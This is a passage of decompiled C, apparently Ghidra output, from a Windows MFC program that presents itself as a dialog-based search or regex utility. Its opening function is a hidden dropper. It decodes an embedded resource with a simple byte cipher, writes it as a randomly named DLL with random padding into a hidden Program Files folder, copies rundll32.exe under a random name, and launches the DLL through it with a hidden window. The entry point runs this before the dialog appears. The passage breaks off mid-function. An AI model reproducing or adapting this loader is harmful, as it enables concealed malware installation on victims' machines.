  int iVar5;
  undefined4 *puVar6;
  int iVar7;
  undefined4 *puVar8;
  LPSTR *ppCVar9;
  undefined4 uVar10;
  CHAR local_6b8;
  undefined4 local_6b7;
  CHAR local_4b8;
  undefined4 local_4b7;
  CHAR local_3b4;
  undefined4 local_3b3;
  CHAR local_2b0;
  undefined4 local_2af;
  CHAR local_1ac;
  undefined4 local_1ab;
  undefined4 local_a8 [9];
  _PROCESS_INFORMATION local_84;
  _STARTUPINFOA local_74;
  undefined *local_30;
  HANDLE local_2c;
  undefined local_28;
  undefined4 local_27;
  undefined4 uStack_23;
  undefined4 uStack_1f;
  undefined2 uStack_1b;
  undefined uStack_19;
  DWORD local_18;
  uint local_14;
  uint local_10;
  uint local_c;
  undefined *local_8;
  
  hResInfo = FindResourceA((HMODULE)0x0,(LPCSTR)0x82,&DAT_0041c108);
  if ((hResInfo != (HRSRC)0x0) &&
     (hResData = (byte *)LoadResource((HMODULE)0x0,hResInfo), hResData != (byte *)0x0)) {
    puVar3 = (undefined *)SizeofResource((HMODULE)0x0,hResInfo);
    local_8 = puVar3;
    _Src = LockResource(hResData);
    memcpy(hResData,_Src,(size_t)puVar3);
    bVar1 = *hResData;
    local_10 = (uint)bVar1;
    bVar2 = hResData[1];
    local_c = (uint)bVar2;
    iVar7 = 0;
    if (0 < (int)local_8) {
      do {
        iVar5 = iVar7 % 3;
        if (iVar5 == 2) {
          hResData[iVar7] = hResData[iVar7] - bVar1;
        }
        if (iVar5 == 1) {
          hResData[iVar7] = hResData[iVar7] - bVar2;
        }
        if (iVar5 == 0) {
          hResData[iVar7] = hResData[iVar7] - (bVar2 + bVar1);
        }
        iVar7 = iVar7 + 1;
      } while (iVar7 < (int)local_8);
    }
    local_1ac = '\0';
    puVar6 = &local_1ab;
    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {
      *puVar6 = 0;
      puVar6 = puVar6 + 1;
    }
    *(undefined2 *)puVar6 = 0;
    *(undefined *)((int)puVar6 + 2) = 0;
    local_2b0 = '\0';
    puVar6 = &local_2af;
    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {
      *puVar6 = 0;
      puVar6 = puVar6 + 1;
    }
    *(undefined2 *)puVar6 = 0;
    *(undefined *)((int)puVar6 + 2) = 0;
    local_28 = 0;
    uVar10 = 5;
    local_27 = 0;
    uStack_23 = 0;
    uStack_1f = 0;
    uStack_1b = 0;
    uStack_19 = 0;
    puVar3 = &local_28;
    FUN_0040107c();
    wsprintfA(&local_1ac,s_d__Program_Files__s_0041c0f4,&local_28,puVar3,uVar10);
    BVar4 = CreateDirectoryA(&local_1ac,(LPSECURITY_ATTRIBUTES)0x0);
    if (BVar4 == 0) {
      wsprintfA(&local_1ac,s_c__Program_Files__s_0041c0e0,&local_28);
      CreateDirectoryA(&local_1ac,(LPSECURITY_ATTRIBUTES)0x0);
    }
    Sleep(100);
    SetFileAttributesA(&local_1ac,2);
    memset(&local_28,0,0x10);
    puVar3 = &local_28;
    uVar10 = 5;
    FUN_0040107c();
    wsprintfA(&local_2b0,s__s__s_dll_0041c0d4,&local_1ac,&local_28,puVar3,uVar10);
    local_2c = CreateFileA(&local_2b0,0x40000000,2,(LPSECURITY_ATTRIBUTES)0x0,2,0x80,(HANDLE)0x0);
    WriteFile(local_2c,hResData,(DWORD)local_8,&local_18,(LPOVERLAPPED)0x0);
    iVar7 = rand();
    local_14 = iVar7 % 0xff;
    local_30 = (undefined *)operator_new(local_14);
    if (0 < (int)local_14) {
      local_c = 0xfa - (int)local_30;
      local_10 = local_14;
      local_8 = local_30;
      do {
        iVar7 = rand();
        puVar3 = local_8 + 1;
        local_10 = local_10 - 1;
        *local_8 = (char)(iVar7 % (int)(local_8 + local_c));
        local_8 = puVar3;
      } while (local_10 != 0);
    }
    hFile = local_2c;
    WriteFile(local_2c,local_30,local_14,&local_18,(LPOVERLAPPED)0x0);
    SetFilePointer(hFile,0,(PLONG)0x0,0);
    WriteFile(hFile,&DAT_0041c0d0,2,&local_18,(LPOVERLAPPED)0x0);
    CloseHandle(hFile);
    puVar6 = (undefined4 *)s_c__windows_system32_rundll32_exe_0041c0ac;
    puVar8 = local_a8;
    for (iVar7 = 8; iVar7 != 0; iVar7 = iVar7 + -1) {
      *puVar8 = *puVar6;
      puVar6 = puVar6 + 1;
      puVar8 = puVar8 + 1;
    }
    *(undefined2 *)puVar8 = *(undefined2 *)puVar6;
    local_3b4 = '\0';
    puVar6 = &local_3b3;
    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {
      *puVar6 = 0;
      puVar6 = puVar6 + 1;
    }
    *(undefined2 *)puVar6 = 0;
    *(undefined *)((int)puVar6 + 2) = 0;
    memset(&local_28,0,0x10);
    puVar3 = &local_28;
    uVar10 = 3;
    FUN_0040107c();
    wsprintfA(&local_3b4,s__s__s_exe_0041c074,&local_1ac,&local_28,puVar3,uVar10);
    CopyFileA((LPCSTR)local_a8,&local_3b4,0);
    local_6b8 = '\0';
    puVar6 = &local_6b7;
    for (iVar7 = 0x7f; iVar7 != 0; iVar7 = iVar7 + -1) {
      *puVar6 = 0;
      puVar6 = puVar6 + 1;
    }
    *(undefined2 *)puVar6 = 0;
    *(undefined *)((int)puVar6 + 2) = 0;
    local_4b8 = '\0';
    puVar6 = &local_4b7;
    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {
      *puVar6 = 0;
      puVar6 = puVar6 + 1;
    }
    *(undefined2 *)puVar6 = 0;
    *(undefined *)((int)puVar6 + 2) = 0;
    GetModuleFileNameA((HMODULE)0x0,&local_4b8,0x104);
    wsprintfA(&local_6b8,s__s___s__DoAddToFavDlg__s_0041c090,&local_3b4,&local_2b0,&local_4b8);
    ppCVar9 = &local_74.lpReserved;
    for (iVar7 = 0x10; iVar7 != 0; iVar7 = iVar7 + -1) {
      *ppCVar9 = (LPSTR)0x0;
      ppCVar9 = ppCVar9 + 1;
    }
    local_74.cb = 0x44;
    local_74.lpDesktop = s_WinSta0_Default_0041c080;
    local_74.wShowWindow = 0;
    CreateProcessA((LPCSTR)0x0,&local_6b8,(LPSECURITY_ATTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0,0,0,
                   (LPVOID)0x0,(LPCSTR)0x0,&local_74,&local_84);
    return 1;
  }
  return 0;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined4 __fastcall FUN_00401703(CWinApp *param_1)

{
  int *piVar1;
  int iVar2;
  CDialog local_94 [132];
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_0041562f;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  AfxEnableControlContainer((COccManager *)0x0);
  CWinApp::Enable3dControls(param_1);
  piVar1 = (int *)__p___argv();
  if (*(int *)(*piVar1 + 4) == 0) {
    FUN_00401194();
  }
  iVar2 = FUN_004013bc();
  if (iVar2 != 0) {
                    // WARNING: Subroutine does not return
    ExitProcess(0xffffffff);
  }
  FUN_00401831(local_94,(CWnd *)0x0);
  local_8 = 0;
  *(CDialog **)(param_1 + 0x20) = local_94;
  CDialog::DoModal(local_94);
  local_8 = 0xffffffff;
  FUN_0040178c(local_94);
  ExceptionList = local_10;
  return 0;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_0040178c(CDialog *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00415665;
  local_10 = ExceptionList;
  local_8 = 3;
  ExceptionList = &local_10;
  CString::~CString((CString *)(param_1 + 0x78));
  local_8._0_1_ = 2;
  CString::~CString((CString *)(param_1 + 0x68));
  local_8._0_1_ = 1;
  CString::~CString((CString *)(param_1 + 100));
  local_8 = (uint)local_8._1_3_ << 8;
  CString::~CString((CString *)(param_1 + 0x60));
  local_8 = 0xffffffff;
  CDialog::~CDialog(param_1);
  ExceptionList = local_10;
  return;
}



undefined4 * __fastcall FUN_004017eb(undefined4 *param_1)

{
  CDialog::CDialog((CDialog *)param_1,100,(CWnd *)0x0);
  *param_1 = &DAT_004174b0;
  return param_1;
}



CDialog * __thiscall FUN_00401801(void *this,byte param_1)

{
  CDialog::~CDialog((CDialog *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (CDialog *)this;
}



void __thiscall CDialog::~CDialog(CDialog *this)

{
                    // WARNING: Could not recover jumptable at 0x0041520e. Too many branches
                    // WARNING: Treating indirect jump as call
  ~CDialog(this);
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined4 * __thiscall FUN_00401831(void *this,CWnd *param_1)

{
  HINSTANCE__ *hInstance;
  HICON pHVar1;
  LPCSTR lpIconName;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_004156a4;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  CDialog::CDialog((CDialog *)this,0x66,param_1);
  local_8 = 0;
  CString::CString((CString *)((int)this + 0x60));
  local_8._0_1_ = 1;
  CString::CString((CString *)((int)this + 100));
  local_8._0_1_ = 2;
  CString::CString((CString *)((int)this + 0x68));
  local_8._0_1_ = 3;
  CString::CString((CString *)((int)this + 0x78));
  local_8 = CONCAT31(local_8._1_3_,4);
  *(undefined **)this = &DAT_00417588;
  CString::operator=((CString *)((int)this + 0x60),&DAT_0041c9a4);
  CString::operator=((CString *)((int)this + 100),&DAT_0041c9a4);
  CString::operator=((CString *)((int)this + 0x68),&DAT_0041c9a4);
  *(undefined4 *)((int)this + 0x6c) = 1;
  *(undefined4 *)((int)this + 0x70) = 0;
  *(undefined4 *)((int)this + 0x74) = 0;
  CString::operator=((CString *)((int)this + 0x78),&DAT_0041c9a4);
  *(undefined4 *)((int)this + 0x7c) = 0;
  AfxGetModuleState();
  lpIconName = (LPCSTR)0x80;
  hInstance = AfxFindResourceHandle((char *)0x80,(char *)0xe);
  pHVar1 = LoadIconA(hInstance,lpIconName);
  *(HICON *)((int)this + 0x80) = pHVar1;
  ExceptionList = local_10;
  return (undefined4 *)this;
}



CDialog * __thiscall FUN_004018f7(void *this,byte param_1)

{
  FUN_0040178c((CDialog *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (CDialog *)this;
}



void __thiscall FUN_00401913(void *this,CDataExchange *param_1)

{
  DDX_Text(param_1,1000,(CString *)((int)this + 0x60));
  DDX_Text(param_1,0x3eb,(CString *)((int)this + 100));
  DDX_Text(param_1,0x3ea,(CString *)((int)this + 0x68));
  DDX_Check(param_1,0x3ed,(int *)((int)this + 0x6c));
  DDX_Check(param_1,0x3ee,(int *)((int)this + 0x70));
  DDX_Check(param_1,0x3ef,(int *)((int)this + 0x74));
  DDX_Text(param_1,0x3f0,(CString *)((int)this + 0x78));
  DDX_Check(param_1,0x3f1,(int *)((int)this + 0x7c));
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __thiscall FUN_00401a50(void *this,uint param_1)

{
  undefined4 local_70 [24];
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_004156cc;
  local_10 = ExceptionList;
  if ((param_1 & 0xfff0) == 0x10) {
    ExceptionList = &local_10;
    FUN_004017eb(local_70);
    local_8 = 0;
    CDialog::DoModal((CDialog *)local_70);
    local_8 = 0xffffffff;
    CDialog::~CDialog((CDialog *)local_70);
  }
  else {
    ExceptionList = &local_10;
    CWnd::Default((CWnd *)this);
  }
  ExceptionList = local_10;
  return;
}



void __fastcall FUN_00401a9f(CWnd *param_1)

{
  BOOL BVar1;
  int iVar2;
  int iVar3;
  CPaintDC local_68 [4];
  HDC local_64;
  tagRECT local_14;
  
  BVar1 = IsIconic(*(HWND *)(param_1 + 0x20));
  if (BVar1 == 0) {
    CWnd::Default(param_1);
  }
  else {
    CPaintDC::CPaintDC(local_68,param_1);
    SendMessageA(*(HWND *)(param_1 + 0x20),0x27,
                 -(uint)(&stack0x00000000 != (undefined *)0x68) & (uint)local_64,0);
    iVar2 = GetSystemMetrics(0xb);
    iVar3 = GetSystemMetrics(0xc);
    GetClientRect(*(HWND *)(param_1 + 0x20),&local_14);
    DrawIcon(local_64,(((local_14.right - local_14.left) - iVar2) + 1) / 2,
             (((local_14.bottom - local_14.top) - iVar3) + 1) / 2,*(HICON *)(param_1 + 0x80));
    CPaintDC::~CPaintDC(local_68);
  }
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __thiscall FUN_00401b41(void *this,char *param_1)

{
  char cVar1;
  size_t sVar2;
  undefined4 *puVar3;
  void *this_00;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar4;
  code *pcVar5;
  CWnd *pCVar6;
  char *pcVar7;
  int iVar8;
  CString *this_01;
  CString *this_02;
  CString *this_03;
  undefined **ppuVar9;
  undefined4 *puVar10;
  uint uVar11;
  undefined *local_19c [21];
  undefined *local_148 [21];
  undefined *local_f4 [3];
  int local_e5;
  undefined4 local_d0 [12];
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_a0 [16];
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_90 [4];
  code *local_8c;
  undefined4 local_80 [2];
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_78 [20];
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_64 [4];
  code *local_60;
  double local_5c;
  double local_54;
  double local_4c;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_44 [4];
  int local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined *local_34;
  undefined local_30 [4];
  undefined4 local_2c;
  int local_28;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *local_1c;
  char *local_18;
  char *local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_0041577a;
  local_10 = ExceptionList;
  if (param_1 == (char *)0x1b) {
    ExceptionList = &local_10;
    CDialog::OnOK((CDialog *)this);
  }
  else if (param_1 == (char *)0x74) {
    ExceptionList = &local_10;
    CWnd::UpdateData((CWnd *)this,1);
    CString::operator=((CString *)((int)this + 100),&DAT_0041c9a4);
    FUN_004024ec(local_30,(undefined *)((int)&param_1 + 3));
    local_34 = &DAT_00417664;
    local_14 = (char *)0x82;
    local_8 = 0;
    if (*(int *)((int)this + 0x6c) != 0) {
      local_14 = (char *)0x83;
    }
    if (*(int *)((int)this + 0x70) != 0) {
      local_14 = (char *)((uint)local_14 | 4);
    }
    if (*(int *)((int)this + 0x74) != 0) {
      local_14 = (char *)((uint)local_14 | 8);
    }
    local_1c = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
               clock();
    pcVar7 = *(char **)((int)this + 0x60);
    local_54 = (double)(int)local_1c;
    local_44[0] = param_1._3_1_;
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
              (local_44,false);
    sVar2 = strlen(pcVar7);
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
              (local_44,pcVar7,sVar2);
    local_8._0_1_ = 1;
    FUN_00402534(local_f4,local_44,local_14,0);
    local_f4[0] = &DAT_00417660;
    local_8 = CONCAT31(local_8._1_3_,3);
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
              (local_44,true);
    local_1c = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
               local_e5;
    local_14 = (char *)0x0;
    cVar1 = FUN_00402ceb((int)local_f4,(int)&local_34,*(char **)((int)this + 0x68));
    if (cVar1 == '\0') {
      puVar3 = (undefined4 *)&DAT_0041cbc0;
    }
    else {
      puVar3 = (undefined4 *)FUN_00402504(local_30,0);
    }
    puVar10 = local_80;
    for (iVar8 = 6; iVar8 != 0; iVar8 = iVar8 + -1) {
      *puVar10 = *puVar3;
      puVar3 = puVar3 + 1;
      puVar10 = puVar10 + 1;
    }
    *(undefined2 *)puVar10 = *(undefined2 *)puVar3;
    if (local_78[0] !=
        (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>)0x0) {
      for (uVar11 = 0; (local_2c != 0 && (uVar11 < (uint)((local_28 - local_2c) / 0x1a)));
          uVar11 = uVar11 + 1) {
        if ((int)uVar11 % (int)local_1c == 1) {
          local_14 = local_14 + 1;
          pbVar4 = local_78;
          this_00 = (void *)FUN_00402504(local_30,uVar11);
          pbVar4 = FUN_004022e2(this_00,pbVar4);
          local_8._0_1_ = 6;
          pcVar5 = *(code **)(pbVar4 + 4);
          if (*(code **)(pbVar4 + 4) == (code *)0x0) {
            pcVar5 = _C_exref;
          }
          CString::operator+=((CString *)((int)this + 100),(char *)pcVar5);
          local_8 = CONCAT31(local_8._1_3_,3);
          std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                    (local_78,true);
          CString::operator+=((CString *)((int)this + 100),
                              s__________________________________0041c154);
        }
      }
    }
    local_1c = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
               clock();
    local_4c = (double)(int)local_1c;
    CString::CString((CString *)&local_18);
    local_8._0_1_ = 7;
    CString::Format(this_01,(char *)&local_18);
    pCVar6 = CWnd::GetDlgItem((CWnd *)this,0x3ec);
    CWnd::SetWindowTextA(pCVar6,local_18);
    CWnd::UpdateData((CWnd *)this,0);
    local_8._0_1_ = 3;
    CString::~CString((CString *)&local_18);
    local_8 = (uint)local_8._1_3_ << 8;
    FUN_00402269(local_f4);
    local_8 = 0xffffffff;
    local_34 = &DAT_00417664;
    FUN_00402249((int)local_30);
  }
  else {
    if (param_1 == (char *)0x75) {
      ExceptionList = &local_10;
      CWnd::UpdateData((CWnd *)this,1);
      CString::operator=((CString *)((int)this + 100),&DAT_0041c9a4);
      param_1 = (char *)0x82;
      if (*(int *)((int)this + 0x6c) != 0) {
        param_1 = (char *)0x83;
      }
      if (*(int *)((int)this + 0x70) != 0) {
        param_1 = (char *)((uint)param_1 | 4);
      }
      if (*(int *)((int)this + 0x74) != 0) {
        param_1 = (char *)((uint)param_1 | 8);
      }
      local_1c = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                 clock();
      pcVar7 = *(char **)((int)this + 0x78);
      local_4c = (double)(int)local_1c;
      local_2c = CONCAT31(local_2c._1_3_,param_1._3_1_);
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                ((basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                 &local_2c,false);
      sVar2 = strlen(pcVar7);
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
                ((basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                 &local_2c,pcVar7,sVar2);
      pcVar7 = *(char **)((int)this + 0x60);
      local_8 = 8;
      local_a0[0] = param_1._3_1_;
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                (local_a0,false);
      sVar2 = strlen(pcVar7);
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
                (local_a0,pcVar7,sVar2);
      local_8._0_1_ = 9;
      FUN_004025a0(local_148,local_a0,
                   (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                   &local_2c,param_1,0);
      local_148[0] = &DAT_00417660;
      local_8._0_1_ = 0xc;
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                (local_a0,true);
      local_8._0_1_ = 0xb;
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                ((basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                 &local_2c,true);
      FUN_004023ae(local_d0,(undefined *)((int)&param_1 + 3));
      pcVar7 = *(char **)((int)this + 0x68);
      local_8._0_1_ = 0xd;
      local_64[0] = param_1._3_1_;
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                (local_64,false);
      sVar2 = strlen(pcVar7);
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
                (local_64,pcVar7,sVar2);
      local_8._0_1_ = 0xe;
      FUN_00402d2d((int)local_148,local_64,local_d0,0,(undefined *)0xffffffff);
      if (local_60 == (code *)0x0) {
        local_60 = _C_exref;
      }
      CString::operator=((CString *)((int)this + 100),(char *)local_60);
      local_1c = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                 clock();
      local_54 = (double)(int)local_1c;
      CString::CString((CString *)&local_18);
      local_8._0_1_ = 0xf;
      CString::Format(this_02,(char *)&local_18);
      pcVar7 = local_18;
      pCVar6 = CWnd::GetDlgItem((CWnd *)this,0x3ec);
      CWnd::SetWindowTextA(pCVar6,pcVar7);
      CWnd::UpdateData((CWnd *)this,0);
      local_8._0_1_ = 0xe;
      CString::~CString((CString *)&local_18);
      local_8._0_1_ = 0xd;
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                (local_64,true);
      local_8 = CONCAT31(local_8._1_3_,0xb);
      FUN_004021a6(local_d0);
      ppuVar9 = local_148;
    }
    else {
      if (param_1 != (char *)0x76) {
        return;
      }
      ExceptionList = &local_10;
      CWnd::UpdateData((CWnd *)this,1);
      CString::operator=((CString *)((int)this + 100),&DAT_0041c9a4);
      param_1 = (char *)0x82;
      if (*(int *)((int)this + 0x6c) != 0) {
        param_1 = (char *)0x83;
      }
      if (*(int *)((int)this + 0x70) != 0) {
        param_1 = (char *)((uint)param_1 | 4);
      }
      if (*(int *)((int)this + 0x74) != 0) {
        param_1 = (char *)((uint)param_1 | 8);
      }
      local_1c = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                 clock();
      local_18 = *(char **)((int)this + 0x60);
      local_5c = (double)(int)local_1c;
      local_2c = CONCAT31(local_2c._1_3_,param_1._3_1_);
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                ((basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                 &local_2c,false);
      sVar2 = strlen(local_18);
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
                ((basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                 &local_2c,local_18,sVar2);
      local_8 = 0x10;
      FUN_00402534(local_19c,
                   (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                   &local_2c,param_1,0);
      local_19c[0] = &DAT_00417660;
      local_8._0_1_ = 0x12;
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                ((basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                 &local_2c,true);
      local_40 = 0;
      local_44[0] = param_1._3_1_;
      local_3c = 0;
      local_38 = 0;
      param_1._3_1_ = SUB41((uint)*(char **)((int)this + 0x68) >> 0x18,0);
      local_8._0_1_ = 0x13;
      local_78[0] = param_1._3_1_;
      param_1 = *(char **)((int)this + 0x68);
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                (local_78,false);
      sVar2 = strlen(param_1);
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
                (local_78,param_1,sVar2);
      local_8 = CONCAT31(local_8._1_3_,0x14);
      pcVar7 = (char *)FUN_004028ac(local_19c,(int)local_78,local_44,0,0,-1);
      local_4c = (double)CONCAT44(pcVar7,local_4c._0_4_);
      if (0 < (int)pcVar7) {
        param_1 = (char *)0x0;
        local_18 = pcVar7;
        do {
          local_1c = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *
                     )(param_1 + local_40);
          local_90[0] = *local_1c;
          std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                    (local_90,false);
          std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
                    (local_90,local_1c,0,*(uint *)npos_exref);
          local_8._0_1_ = 0x15;
          pcVar5 = local_8c;
          if (local_8c == (code *)0x0) {
            pcVar5 = _C_exref;
          }
          CString::operator+=((CString *)((int)this + 100),(char *)pcVar5);
          CString::operator+=((CString *)((int)this + 100),
                              s__________________________________0041c154);
          local_8 = CONCAT31(local_8._1_3_,0x14);
          std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                    (local_90,true);
          param_1 = param_1 + 0x10;
          local_18 = local_18 + -1;
        } while (local_18 != (char *)0x0);
      }
      param_1 = (char *)clock();
      local_54 = (double)(int)param_1;
      CString::CString((CString *)&local_14);
      local_8._0_1_ = 0x16;
      CString::Format(this_03,(char *)&local_14);
      pCVar6 = CWnd::GetDlgItem((CWnd *)this,0x3ec);
      CWnd::SetWindowTextA(pCVar6,local_14);
      CWnd::UpdateData((CWnd *)this,0);
      local_8._0_1_ = 0x14;
      CString::~CString((CString *)&local_14);
      local_8._0_1_ = 0x13;
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                (local_78,true);
      local_8 = CONCAT31(local_8._1_3_,0x12);
      FUN_00402408((int)local_44);
      ppuVar9 = local_19c;
    }
    local_8 = 0xffffffff;
    FUN_00402269(ppuVar9);
  }
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall thunk_FUN_00402269(undefined4 *param_1)

{
  void *pvStack_10;
  undefined *puStack_c;
  undefined4 uStack_8;
  
  puStack_c = &LAB_004157cf;
  pvStack_10 = ExceptionList;
  ExceptionList = &pvStack_10;
  *param_1 = &DAT_00417668;
  uStack_8 = 4;
  FUN_004028fb((char *)((int)param_1 + 0x23));
  FUN_004028fb((char *)((int)param_1 + 0x2b));
  FUN_004024aa((void **)(param_1 + 1));
  uStack_8._0_1_ = 3;
  FUN_004024c1((int *)((int)param_1 + 0x43));
  uStack_8._0_1_ = 2;
  FUN_004024c1((int *)((int)param_1 + 0x33));
  uStack_8._0_1_ = 1;
  FUN_0040260b((char *)((int)param_1 + 0x2b));
  uStack_8 = (uint)uStack_8._1_3_ << 8;
  FUN_0040260b((char *)((int)param_1 + 0x23));
  ExceptionList = pvStack_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_004021a6(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_0041578c;
  local_10 = ExceptionList;
  local_8 = 0;
  ExceptionList = &local_10;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
            ((basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
             (param_1 + 6),true);
  local_8 = 0xffffffff;
  *param_1 = &DAT_00417664;
  FUN_00402249((int)(param_1 + 1));
  ExceptionList = local_10;
  return;
}



void __fastcall FUN_00402210(CWnd *param_1)

{
  CWnd *this;
  uint uVar1;
  
  CWnd::UpdateData(param_1,1);
  uVar1 = (uint)(*(int *)(param_1 + 0x7c) != 0);
  this = CWnd::GetDlgItem(param_1,0x3f0);
  CWnd::EnableWindow(this,uVar1);
  return;
}



void __fastcall FUN_0040223b(undefined4 *param_1)

{
  *param_1 = &DAT_00417664;
  FUN_00402249((int)(param_1 + 1));
  return;
}



void __fastcall FUN_00402249(int param_1)

{
  operator_delete(*(void **)(param_1 + 4));
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)(param_1 + 8) = 0;
  *(undefined4 *)(param_1 + 0xc) = 0;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00402269(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_004157cf;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_00417668;
  local_8 = 4;
  FUN_004028fb((char *)((int)param_1 + 0x23));
  FUN_004028fb((char *)((int)param_1 + 0x2b));
  FUN_004024aa((void **)(param_1 + 1));
  local_8._0_1_ = 3;
  FUN_004024c1((int *)((int)param_1 + 0x43));
  local_8._0_1_ = 2;
  FUN_004024c1((int *)((int)param_1 + 0x33));
  local_8._0_1_ = 1;
  FUN_0040260b((char *)((int)param_1 + 0x2b));
  local_8 = (uint)local_8._1_3_ << 8;
  FUN_0040260b((char *)((int)param_1 + 0x23));
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> * __thiscall
FUN_004022e2(void *this,
            basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_1)

{
  char *pcVar1;
  char *pcVar2;
  uint uVar3;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar4;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_34 [16];
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_24 [16];
  uint local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415824;
  local_10 = ExceptionList;
  local_14 = 0;
  if (*(char *)((int)this + 8) == '\0') {
    local_34[0] = param_1._3_1_;
    ExceptionList = &local_10;
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
              (local_34,false);
    local_14 = 2;
    pbVar4 = local_34;
    local_8 = 2;
  }
  else {
    pcVar1 = *(char **)((int)this + 4);
                    // WARNING: Load size is inaccurate
    pcVar2 = *this;
    local_24[0] = param_1._3_1_;
    ExceptionList = &local_10;
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
              (local_24,false);
